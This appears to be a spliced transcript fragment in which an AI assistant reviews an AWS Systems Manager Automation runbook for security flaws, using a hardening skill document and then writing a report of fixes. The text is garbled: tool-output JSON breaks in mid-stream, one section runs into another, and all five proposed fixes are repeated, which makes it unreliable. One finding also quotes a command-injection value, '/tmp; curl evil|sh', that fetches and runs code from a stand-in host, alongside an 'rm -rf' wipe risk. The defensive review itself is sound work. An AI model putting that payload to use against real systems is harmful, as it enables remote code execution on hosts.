{"id": "d5d9fd12-dbb3-45ac-a3c8-0774b1ade60a", "role": "user", "content": [{"text": "Review this Automation runbook for security problems before I share it with other teams, and give me a hardened version:

```yaml
schemaVersion: '0.3'
description: Restarts the app service and rotates its log directory.
assumeRole: [redacted ARN]
parameters:
  InstanceId:
    type: String
  LogPath:
    type: String
    allowedPattern: '.*'
  DbPassword:
    type: SecureString
mainSteps:
  - name: RotateLogs
    action: aws:runCommand
    onFailure: Continue
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds: ['{{InstanceId}}']
      Parameters:
        commands:
          - tar czf /var/tmp/logs.tgz {{LogPath}} && rm -rf {{LogPath}}/*
          - echo "restarting with password {{DbPassword}}"
          - curl -k https://internal-api.example.com/notify
  - name: CheckHealth
    action: aws:executeScript
    timeoutSeconds: 1200
    onCancel: step:Wait
    inputs:
      Runtime: python3.11
      Handler: handler
      Script: |-
        import boto3
        def handler(events, context):
            return boto3.client('ec2').describe_instance_status()
  - name: Wait
    action: aws:sleep
    inputs: {Duration: PT10S}
```", "type": "text"}], "created_at": null}

Every check\\nin this chapter is grounded in a public Systems Manager or IAM documentation page, cited in\\n[references/automation/hardening-detection-rules.md](references/automation/hardening-detection-rules.md).\\n\\nThis review is static. It reads the document only. It doesn\\'t run the runbook, and it doesn\\'t\\ncheck the IAM policy of the role the runbook assumes; review that role separately.\\n\\n## When to use\\n\\n- A user asks to review or harden a runbook they wrote, before publishing or sharing it.\\n- A release or prevention review includes account-owned runbooks.\\n\\nTo choose a runbook for a problem, hand off to\\n[references/automation/runbook-discovery.md](references/automation/runbook-discovery.md); to run one, to\\n[references/automation/execution.md](references/automation/execution.md).\\n\\n## Workflow\\n\\nCopy this checklist and work through it in order:\\n\\n- [ ] Step 1: Read the document (Phase 1)\\n- [ ] Step 2: Scan with every check in the detection rules (Phase 2)\\n- [ ] Step 3: Apply, propose or flag fixes (Phase 3)\\n- [ ] Step 4: Write the report and the hardened document (Phase 4)\\n- [ ] Step 5: Check the output, then present it\\n\\n## Phase 1: Read the document\\n\\n1. Get the document. If the user names a runbook in their account, call\\n   `aws ssm get-document --name <name> --region <region>`, and add `--document-version <n>` if\\n   they named a version. Otherwise use the content the user provides.\\n2. Note the format (YAML or JSON). The hardened document must use the same format.\\n3. Check `schemaVersion`. If it isn\\'t `\"0.3\"`, stop: Automation runbooks must use schema version\\n   0.3. A `2.2` document is a Command document, which this chapter doesn\\'t cover.\\n4. List `parameters` (name, type, constraints), `assumeRole`, and every step in `mainSteps`\\n   (name, action, inputs, `onFailure`, `onCancel`, `timeoutSeconds`, `maxAttempts`), including\\n   steps nested in `aws:loop`.\\n\\n## Phase 2: Scan\\n\\nOpen [references/automation/hardening-detection-rules.md](references/automation/hardening-detection-rules.md) and apply every check, in\\norder:\\n\\n| # | Check | Severity |\\n|---|---|---|\\n| 1 | Command injection: parameters or step outputs interpolated into shell or PowerShell commands | Critical |\\n| 2 | Secrets: hard-coded credentials, secret values passed as parameters, secrets in outputs | Critical |\\n| 3 | Parameter validation: missing or weak `allowedPattern`, `allowedValues`, length and item limits | High (Critical for parameters used in commands) |\\n| 4 | Role: missing `assumeRole` where the runbook needs it | High |\\n| 5 | Step limits: timeouts beyond documented limits | Medium |\\n| 6 | Failure and cancel routing: invalid `onFailure` / `onCancel` values or targets | Medium |\\n| 7 | Approval steps: `aws:approve` misconfiguration | Medium |\\n| 8 | Cross-account role assumption from a step | Medium |\\n| 9 | TLS verification disabled in a command or script | High |\\n| 10 | Document structure: schema version, required fields, parameter types, step names | Low |\\n\\nFor each finding record the check number, severity, the parameter or step (and JSON path), what is\\nwrong, and the documentation page that backs it.\\n\\nNever repeat a secret\\'s value in a finding. Give its location and tell the user to rotate it.\\n\\n## Phase 3: Fix\\n\\nUse [references/automation/hardening-fix-patterns.md](references/automation/hardening-fix-patterns.md). Fixes come in three kinds:\\n\\n| Kind | Applies to | What you do |\\n|---|---|---|\\n| Apply | Deterministic changes to existing fields: add or tighten `allowedPattern`, fix an ARN pattern\\'s partition, correct a timeout above a documented maximum, correct an invalid parameter type | Change the document directly. Don\\'t add steps |\\n| Propose | Changes that alter behaviour: rewriting a command that interpolates parameters, moving a secret to Parameter Store, adding `assumeRole`, rerouting `onCancel` | Apply in the hardened document, and show each change as BEFORE / AFTER with the reason |\\n| Flag | Problems that need a redesign, or where the right fix depends on facts outside the document | Don\\'t change the document. Describe the problem and what a redesign must address |\\n\\nFlag rather than fix when proposed changes would touch most of the steps; patching that much\\nleaves a document that is harder to review than a rewrite.\\n\\nDon\\'t weaken an existing control to make the document pass, and don\\'t remove a parameter the\\ndocument needs; change how it is used instead.\\n\\n## Phase 4: Report\\n\\nWrite the report with the structure in\\n[references/automation/hardening-report-template.md](references/automation/hardening-report-template.md): a summary table by severity,\\napplied fixes, proposed fixes as BEFORE / AFTER with their source, flagged items, checks with no\\nfindings, what the review didn\\'t cover, and the complete hardened document in the input\\'s format.\\n\\n## Phase 5: Check the output\\n\\nBefore presenting the report, confirm:\\n\\n- The hardened document parses as YAML or JSON, and every `allowedPattern` in it is still a\\n  valid regular expression.\\n- Every finding names a check from the detection rules and its source page.\\n- No secret value from the input appears anywhere in the report or the hardened document.\\n- Every difference between the input and the hardened document is listed as an applied or\\n  proposed fix.\\n\\nFix anything that doesn\\'t hold before you answer.\\n\\n## Gotchas\\n\\n- Steps inside an `aws:loop` (`inputs.Steps`) are steps too; scan them.\\n- A parameter name containing \"key\" is often an identifier (`KeyName`, `KmsKeyId`, `S3Key`), not a\\n  secret.\\n- `allowedPattern` protects parameters only. A value from `{{StepName.OutputName}}` is never\\n  validated by it.\\n- Patterns must work in both Java regex and Go `regexp`: avoid lookahead and backreferences.\\n- In JSON documents every backslash in a pattern is doubled; in YAML, single-quote the pattern.\\n\\n## Constraints\\n\\n- Report only findings backed by a check in the detection rules.\\n- Never print a secret\\'s value.\\n- Keep the document\\'s behaviour, apart from the fixes you list.\\n- The hardened document must still parse: in JSON, escape backslashes in regular expressions\\n  (`\\\\` becomes `\\\\\\\\`); in YAML, single-quote patterns that contain `\\\\`, `{` or `}`.\\n'}]", "status": "success", "type": "tool_result"}, {"id": "tooluse_dcW1ZkarVPTTxihl6ck5KO", "content": "[{'text': '# Detection rules\\n\\nEach check names the public documentation it relies on. ## Applied fixes
These are deterministic changes to existing fields.
- **`InstanceId` (High, check 3):** It had no `allowedPattern`. I added `^i-(?:[a-f0-9]{8}|[a-f0-9]{17})$`. (Source: Parameters page)
- **`CheckHealth.timeoutSeconds` (Medium, check 5):** I lowered it from 1200 to 600, the documented maximum for `aws:executeScript`. (Source: `aws:executeScript` action page)
- **`DbPassword` type (Low, check 10):** `SecureString` isn't a valid document parameter type. I changed it to `String`, and it now holds a Parameter Store parameter name (see the secrets fix below). (Source: Parameters page)

## Proposed fixes

**PROPOSED FIX 1: Constrain `LogPath` (Critical, checks 1 and 3)**
- **Issue:** `allowedPattern: '.*'` accepts anything. `LogPath` goes straight into shell text, so `/tmp; curl evil|sh` runs as root. Even a harmless value such as an empty string or `/` turns `rm -rf {{LogPath}}/*` into a wipe of the instance.
- **BEFORE:**
  ```yaml
  allowedPattern: '.*'
  ...
  - tar czf /var/tmp/logs.tgz {{LogPath}} && rm -rf {{LogPath}}/*
  ```
- **AFTER:**
  ```yaml
  allowedPattern: '^/var/log/[A-Za-z0-9_-][A-Za-z0-9._-]*(/[A-Za-z0-9_-][A-Za-z0-9._-]*)*$'
  maxChars: 255
  ...
  - tar czf /var/tmp/logs.tgz '{{LogPath}}' && rm -rf '{{LogPath}}'/*
  ```
- The pattern allows only paths under `/var/log/`. No path segment can start with `.`, so `..` traversal is blocked. It also rejects spaces, quotes and shell metacharacters. **The `/var/log/` prefix is my assumption.** Change it if your logs live elsewhere.
- **Source:** Schemas page, "Parameter security best practices"

**PROPOSED FIX 2: Stop passing and printing the DB password (Critical, check 2)**
- **Issue:** The password is a runbook parameter, and `echo "restarting with password {{DbPassword}}"` writes it into the command text. That puts it in Run Command history, command output and the execution's parameters.
- **BEFORE:**
  ```yaml
  DbPassword: {type: SecureString}
  - echo "restarting with password {{DbPassword}}"
  ```
- **AFTER:**
  ```yaml
  DbPasswordParameterName:
    type: String
    description: (Required) Name of the SecureString parameter that holds the database password.
    allowedPattern: '^[a-zA-Z0-9_./-]{1,1011}$'
  ...
  - echo "restarting app service"
  ```
- If a real restart step needs the password, read it at run time from the Parameter Store `SecureString`. Use `aws ssm get-parameter --with-decryption` inside the command, and pass the value by stdin or an environment variable, never as a command argument. The instance profile then needs `ssm:GetParameter` on that parameter and `kms:Decrypt` on its key.
- **Rotate the password** if this runbook has ever run with a real value.
- **Source:** Data protection, Security best practices, and Parameter Store in Run Command pages

**PROPOSED FIX 3: Make the assume role a parameter (High, check 4)**
- **Issue:** `assumeRole` is hard-coded to one account's role, so other teams can't use the runbook in their accounts.
- **BEFORE:** `assumeRole: [redacted ARN]`
- **AFTER:**
  ```yaml
  assumeRole: '{{AutomationAssumeRole}}'
  parameters:
    AutomationAssumeRole:
      type: AWS::IAM::Role::Arn
      description: (Required) ARN of the role that Automation assumes to run this runbook.
  ```
- **Source:** Running an automation page

**PROPOSED FIX 4: Re-enable TLS verification (High, check 9)**
- **Issue:** `curl -k` disables certificate checks, so the notify call can be intercepted or spoofed.
- **BEFORE:** `- curl -k https://internal-api.example.com/notify`
- **AFTER:** `- curl https://internal-api.example.com/notify`
- If this fails afterwards, the fix belongs on the endpoint, such as its certificate or the CA on the instances. Don't put `-k` back.
- **Source:** Data protection page

**PROPOSED FIX 5: Invalid `onCancel` target (Medium, check 6)**
- **Issue:** `onCancel: step:Wait` points at an `aws:sleep` step, and `aws:sleep` can't be a cancel target. The step also doesn't clean anything up.
- **BEFORE:** `onCancel: step:Wait`
- **AFTER:** The line is removed, so it defaults to `Abort`.
- If you want real cleanup on cancel, such as deleting a half-written `/var/tmp/logs.tgz`, add an `aws:executeScript` or `aws:executeAwsApi` step that finishes within 2 minutes and route to it.
- **Source:** Actions page, "Properties shared by all actions"

## Flagged for redesign
None.

## For your confirmation
- **`onFailure: Continue` on `RotateLogs` (not a finding):** If the tar or rm fails, the runbook carries on to `CheckHealth` and can still end as a success. Confirm that's intended.
- **Missing restart step (behaviour note, outside the checks):** The description says it restarts the app service, but no step does that. With the secret echo removed, `DbPasswordParameterName` is unused. Either add the restart step that reads it, or delete the parameter.

## Checks with no findings
7 (approval steps) and 8 (cross-account role assumption).

## Not covered by this review
- The IAM policy of `AppOpsRole` and whatever role callers will pass. Review the permissions separately, especially `ssm:SendCommand` scope.
- The AWS-owned `AWS-RunShellScript` document, beyond how parameters are passed to it.

**PROPOSED FIX 1: Constrain `LogPath` (Critical, checks 1 and 3)**
- **Issue:** `allowedPattern: '.*'` accepts anything. `LogPath` goes straight into shell text, so `/tmp; curl evil|sh` runs as root. Even a harmless value such as an empty string or `/` turns `rm -rf {{LogPath}}/*` into a wipe of the instance.
- **BEFORE:**
  ```yaml
  allowedPattern: '.*'
  ...
  - tar czf /var/tmp/logs.tgz {{LogPath}} && rm -rf {{LogPath}}/*
  ```
- **AFTER:**
  ```yaml
  allowedPattern: '^/var/log/[A-Za-z0-9_-][A-Za-z0-9._-]*(/[A-Za-z0-9_-][A-Za-z0-9._-]*)*$'
  maxChars: 255
  ...
  - tar czf /var/tmp/logs.tgz '{{LogPath}}' && rm -rf '{{LogPath}}'/*
  ```
- The pattern allows only paths under `/var/log/`. No path segment can start with `.`, so `..` traversal is blocked. It also rejects spaces, quotes and shell metacharacters. **The `/var/log/` prefix is my assumption.** Change it if your logs live elsewhere.
- **Source:** Schemas page, "Parameter security best practices"

**PROPOSED FIX 2: Stop passing and printing the DB password (Critical, check 2)**
- **Issue:** The password is a runbook parameter, and `echo "restarting with password {{DbPassword}}"` writes it into the command text. That puts it in Run Command history, command output and the execution's parameters.
- **BEFORE:**
  ```yaml
  DbPassword: {type: SecureString}
  - echo "restarting with password {{DbPassword}}"
  ```
- **AFTER:**
  ```yaml
  DbPasswordParameterName:
    type: String
    description: (Required) Name of the SecureString parameter that holds the database password.
    allowedPattern: '^[a-zA-Z0-9_./-]{1,1011}$'
  ...
  - echo "restarting app service"
  ```
- If a real restart step needs the password, read it at run time from the Parameter Store `SecureString`. Use `aws ssm get-parameter --with-decryption` inside the command, and pass the value by stdin or an environment variable, never as a command argument. The instance profile then needs `ssm:GetParameter` on that parameter and `kms:Decrypt` on its key.
- **Rotate the password** if this runbook has ever run with a real value.
- **Source:** Data protection, Security best practices, and Parameter Store in Run Command pages

**PROPOSED FIX 3: Make the assume role a parameter (High, check 4)**
- **Issue:** `assumeRole` is hard-coded to one account's role, so other teams can't use the runbook in their accounts.
- **BEFORE:** `assumeRole: [redacted ARN]`
- **AFTER:**
  ```yaml
  assumeRole: '{{AutomationAssumeRole}}'
  parameters:
    AutomationAssumeRole:
      type: AWS::IAM::Role::Arn
      description: (Required) ARN of the role that Automation assumes to run this runbook.
  ```
- **Source:** Running an automation page

**PROPOSED FIX 4: Re-enable TLS verification (High, check 9)**
- **Issue:** `curl -k` disables certificate checks, so the notify call can be intercepted or spoofed.
- **BEFORE:** `- curl -k https://internal-api.example.com/notify`
- **AFTER:** `- curl https://internal-api.example.com/notify`
- If this fails afterwards, the fix belongs on the endpoint, such as its certificate or the CA on the instances. Don't put `-k` back.
- **Source:** Data protection page

**PROPOSED FIX 5: Invalid `onCancel` target (Medium, check 6)**
- **Issue:** `onCancel: step:Wait` points at an `aws:sleep` step, and `aws:sleep` can't be a cancel target. The step also doesn't clean anything up.
- **BEFORE:** `onCancel: step:Wait`
- **AFTER:** The line is removed, so it defaults to `Abort`.
- If you want real cleanup on cancel, such as deleting a half-written `/var/tmp/logs.tgz`, add an `aws:executeScript` or `aws:executeAwsApi` step that finishes within 2 minutes and route to it.
- **Source:** Actions page, "Properties shared by all actions"
